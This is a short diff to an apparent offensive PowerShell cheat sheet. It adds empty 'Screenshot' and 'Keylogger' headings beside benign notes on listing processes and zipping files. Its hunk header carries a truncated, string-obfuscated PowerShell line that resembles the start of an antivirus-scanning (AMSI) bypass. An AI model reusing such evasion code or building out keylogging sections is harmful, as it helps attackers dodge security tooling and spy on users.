@@ -36,6 +36,13 @@ sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) 
 - Check Powershell version `$PSVersionTable. PSVersion`
 - List processes `Get-Process`
 
+
+## Screenshot
+
+
+## Keylogger
+
+
 ## Zipping files and directories
 
 `Compress-Archive -Path C:\path\to\file\*.jpg -DestinationPath C:\path\to\archive.zip`
